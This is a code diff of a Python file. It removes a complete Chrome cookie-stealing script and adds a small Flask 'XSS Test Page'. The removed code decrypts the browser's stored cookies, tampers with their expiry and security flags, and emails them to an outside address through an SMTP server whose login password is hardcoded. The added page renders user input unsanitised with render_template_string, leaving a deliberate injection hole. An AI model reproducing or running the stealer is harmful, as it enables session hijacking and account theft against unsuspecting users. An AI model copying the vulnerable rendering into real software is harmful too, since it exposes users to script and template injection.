@@ -1,114 +1,28 @@
-import os
-import json
-import base64
-import sqlite3
-import shutil
-from datetime import datetime, timedelta
-import win32crypt # pip install pypiwin32
-from Crypto.Cipher import AES # pip install pycryptodome
-import smtplib
-from email.mime.text import MIMEText
-from email.mime.multipart import MIMEMultipart
+from flask import Flask, request, render_template_string
 
-def get_chrome_datetime(chromedate):
-    """Return a `datetime.datetime` object from a chrome format datetime"""
-    if chromedate != 86400000000 and chromedate:
-        try:
-            return datetime(1601, 1, 1) + timedelta(microseconds=chromedate)
-        except Exception as e:
-            print(f"Error: {e}, chromedate: {chromedate}")
-            return chromedate
-    else:
-        return ""
+app = Flask(__name__)
 
-def get_encryption_key():
-    local_state_path = os.path.join(os.environ["USERPROFILE"],
-                                    "AppData", "Local", "Google", "Chrome",
-                                    "User Data", "Local State")
-    with open(local_state_path, "r", encoding="utf-8") as f:
-        local_state = f.read()
-        local_state = json.loads(local_state)
+@app.route('/')
+def index():
+    return '''
+    <h1>Welcome to the XSS Test Page</h1>
+    <form method="POST" action="/submit">
+        <label for="input">Enter something:</label><br>
+        <input type="text" id="input" name="input"><br>
+        <button type="submit">Submit</button>
+    </form>
+    '''
 
-    key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])
-    key = key[5:]
-    return win32crypt.CryptUnprotectData(key, None, None, None, 0)[1]
+@app.route('/submit', methods=['POST'])
+def submit():
+    user_input = request.form.get('input', '')
+    # Vulnerable rendering: Directly displaying user input without sanitization
+    response = f"""
+    <h1>Submitted Data</h1>
+    <p>You entered: {user_input}</p>
+    <a href="/">Go back</a>
+    """
+    return render_template_string(response)
 
-def decrypt_data(data, key):
-    try:
-        iv = data[3:15]
-        data = data[15:]
-        cipher = AES.new(key, AES.MODE_GCM, iv)
-        return cipher.decrypt(data)[:-16].decode()
-    except:
-        try:
-            return str(win32crypt.CryptUnprotectData(data, None, None, None, 0)[1])
-        except:
-            return ""
-
-def send_email(body, subject, sender_email, sender_password, receiver_email):
-    # Set up the SMTP server and send the email
-    msg = MIMEMultipart()
-    msg['From'] = sender_email
-    msg['To'] = receiver_email
-    msg['Subject'] = subject
-
-    msg.attach(MIMEText(body, 'plain'))
-    
-    try:
-        # Connect to Seznam SMTP server
-        with smtplib.SMTP('smtp.seznam.cz', 587) as server:
-            server.starttls()  # Secure connection
-            server.login(sender_email, sender_password)
-            server.sendmail(sender_email, receiver_email, msg.as_string())
-        print("Email sent successfully!")
-    except Exception as e:
-        print(f"Failed to send email: {e}")
-
-def main():
-    db_path = os.path.join(os.environ["USERPROFILE"], "AppData", "Local",
-                            "Google", "Chrome", "User Data", "Default", "Network", "Cookies")
-    filename = "Cookies.db"
-    if not os.path.isfile(filename):
-        shutil.copyfile(db_path, filename)
-
-    db = sqlite3.connect(filename)
-    db.text_factory = lambda b: b.decode(errors="ignore")
-    cursor = db.cursor()
-
-    cursor.execute("""SELECT host_key, name, value, creation_utc, last_access_utc, expires_utc, encrypted_value FROM cookies""")
-
-    key = get_encryption_key()
-    
-    cookies_info = ""
-    for host_key, name, value, creation_utc, last_access_utc, expires_utc, encrypted_value in cursor.fetchall():
-        if not value:
-            decrypted_value = decrypt_data(encrypted_value, key)
-        else:
-            decrypted_value = value
-        
-        cookies_info += f"""
-        URL: {host_key}
-        Cookie name: {name}
-        Cookie value (decrypted): {decrypted_value}
-        Creation datetime (UTC): {get_chrome_datetime(creation_utc)}
-        Last access datetime (UTC): {get_chrome_datetime(last_access_utc)}
-        Expires datetime (UTC): {get_chrome_datetime(expires_utc)}
-        ===============================================================
-        """
-
-        cursor.execute("""UPDATE cookies SET value = ?, has_expires = 1, expires_utc = 99999999999999999, is_persistent = 1, is_secure = 0 WHERE host_key = ? AND name = ?""", (decrypted_value, host_key, name))
-
-    db.commit()
-    db.close()
-
-    # Email details
-    sender_email = "info@infopeklo.cz"
-    sender_password = "Polik789"
-    receiver_email = "alfikeita.com"
-    subject = "Decrypted Chrome Cookies Information"
-    
-    # Send email with the cookies information
-    send_email(cookies_info, subject, sender_email, sender_password, receiver_email)
-
-if __name__ == "__main__":
-    main()
+if __name__ == '__main__':
+    app.run(host='0.0.0.0', port=8080)
